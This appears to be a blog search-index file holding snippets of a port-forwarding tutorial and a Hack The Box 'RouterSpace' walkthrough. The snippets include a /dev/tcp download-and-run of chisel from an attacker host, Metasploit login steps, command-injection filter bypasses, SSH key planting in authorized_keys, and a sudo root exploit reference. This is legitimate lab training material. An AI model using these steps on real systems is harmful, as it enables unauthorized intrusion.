@@ -1,0 +1,34 @@
+[
+  
+  {
+    "title": "Basic Port Forwarding Techniques",
+    "url": "/posts/PortForwarding/",
+    "categories": "Tutorials, Port Forwarding",
+    "tags": "ssh, chisel, socat, netcat, msf",
+    "date": "2022-03-08 11:28:00 +0100",
+    
+
+
+
+
+
+    "snippet": "In this post we will see different port forwarding tools and techniques.To see the different examples, we will use the following fictitious scenario.Our attacking Kali machine (192.168.164.133) and our victim Ubuntu machine (192.168.164.130) which is running a python simple HTTP server only accessible locally.The different tools that we are going to see are:  SSH  Chisel  Socat  Netcat  Msfconsole / meterpreterSHHWe can pivot using ssh in three different ways:  SSH Local port forwarding  SSH Remote port forwarding  SSH Dynamic port forwarding (SOCKS)SSH Local port forwarding      root@kali:~$ ssh -L 9000:127.0.0.1:8000 ust@192.168.164.130This command will make the remote web server accessible, on our localhost on port 9000.SSH Remote port forwarding    victim@ubuntu:~$ sudo ssh -R 9090:localhost:8000 kali@192.168.164.133We have to run this command from the victim machine, once we have gained access to it. With this command, we will be able to access from our Kali to the remote application in our localhost, port 9090.SSH Dynamic port forwarding (SOCKS)First we need to configure our proxychains file: /etc/proxychains.confWe set socks4 on port 9000.Then we run the following ssh command:    root@kali:~$ ssh -D 9000 victim@192.168.164.130After that, we need to configure the proxy in our browser (in this case, using foxyproxy.)We set the Proxy Type as SOCKS4 and use the configuration we put in the proxychains.conf file.Finally, we will be able to reach the remote HTTP server from our Kali as is it shown in the image below.ChiselHow to install and execute Chisel:Kali machine:root@kali:~/tools$ git clone https://github.com/jpillora/chisel.gitroot@kali:~/tools$ cd chiselroot@kali:~/tools/chisel$ go build –ldflags=“-s –w”root@kali:~/tools/chisel$ upx brute chisel root@kali:~/tools/chisel$ nc -lvnp 6666 &amp;lt; chiselroot@kali:~/tools/chisel$ ./chisel server -p 8002 -reverse -vVictim machine:ust@ubuntu:~/tmp$ cat &amp;lt; /dev/tcp/192.168.164.133/6666 &amp;gt; chiselust@ubuntu:~/tmp$ chmod 755 chiselust@ubuntu:~/tmp$ ./chisel client 192.168.164.133:8002 R:127.0.0.1:8000Then we will be able to reach the remote HTTP server in our localhost port 8000.Socatroot@kali:~/tools$ socat TCP-LISTEN:localport,fork,reuseaddr TCP:remoteIP:remoteportroot@kali:~/tools$ socat TCP-LISTEN:10000,fork,reuseaddr TCP:192.168.164.130:8000Netcatroot@kali:~/tools$ mknod pivot proot@kali:~/tools$ nc -l -p 12000 0&amp;lt;pivot | nc 192.168.164.130 8000 1&amp;gt;pivotMsfconsole / meterpreterUse auxiliary/scanner/ssh/ssh_login module to create a sessionroot@kali:~/tools$ msfconsolemsf5 use auxiliary/scanner/ssh/ssh_loginmsf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set rhosts 192.168.164.130msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set username victimmsf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set password passmsf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; exploit msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; sessions -l msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; sessions -u ‘id’msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; sessions -i ‘id’Once connected, use the meterpreter session opened and do the port forwarding:meterpreter &amp;gt; portfwd -hmeterpreter &amp;gt; portfwd add -l 1234 -p 8000 -r 192.168.164.130meterpreter &amp;gt; portfwd listPracticeIf you want to practice the techniques and tools explained in this post, you can make the following hack the box machines:  Granny  Grandpa  Vault  Reddish"
+  },
+  
+  {
+    "title": "Router Space HTB Walkthrough ",
+    "url": "/posts/RouterSpace/",
+    "categories": "HTB, Walkthrough",
+    "tags": "apk, command injection, CVE-2021-3156",
+    "date": "2022-03-08 11:28:00 +0100",
+    
+
+
+
+
+
+    "snippet": "Initial FootholdWe start with a basic nmap. We see that we have port 22 (ssh) and 80 (http) open.On port 80, we find the following web application:The download button will download an apk file.If we install this program in an emulator, in our case anbox, we can see the following application:To see if the application makes any http requests, we can set burp as a proxy and intercept the requests.To do this, we can configure the burp as follows:In the address field, we use the IP of our HTB vpn, in my case the tun0 interface IP address. Using adb, we configure the anbox emulator proxy:adb shell settings put global http_proxy &amp;lt;IP&amp;gt;:8080Once configured, we will see the following request made by the application:We send this request to the repeater.If we try to launch it again, it will give us the following error:Unknown host: routerspace.htbTo fix this, we add routerspace.htb to /etc/host. Once added, the request will work for us.If we modify the IP parameter, to try to inject a command, we see in the response that it is simply reflected:But if we try to bypass the filter with the following characters, for example: ;, |, \\n, we see in the response the result of the command.If we try to send ourselves a reverse shell, it will not reach us. Surely there is some rule in the firewall.Gain accessRemember that we had an ssh service running on the victim machine.Check if the /home/paul/.ssh/authorized_keys file exists:We can generate an rsa key for ssh and write the public key to the authorized_keys file to gain access to the server via ssh.To generate the keys:ssh-keygen -t rsaTo upload the public key:; echo &#39;public key&#39;Once uploaded, we can connect with the following command:ssh -i id_rsa paul@10.10.11.148In paul’s home, we have the user.txt.Privilege EscalationTo escalate privileges, we will use LinPEAS.sh.To transfer the file to the victim machine, we can do it through scp:scp -i id_rsa ~/tools/PrivEsc/linux/linpeas.sh paul@10.10.11.148:.Execute:./linpeas.shIn the output of the tool, ee see that it is vulnerable to CVE-2021-3156 (Sudo Baron Samedit) as is is shown in the image below:To exploit the vulnerability we will use the following exploit:  Exploit (Worawit)Transfer the exploit using scp and execute it:And finally, we are root! 🔥"
+  }
+  
+]
+
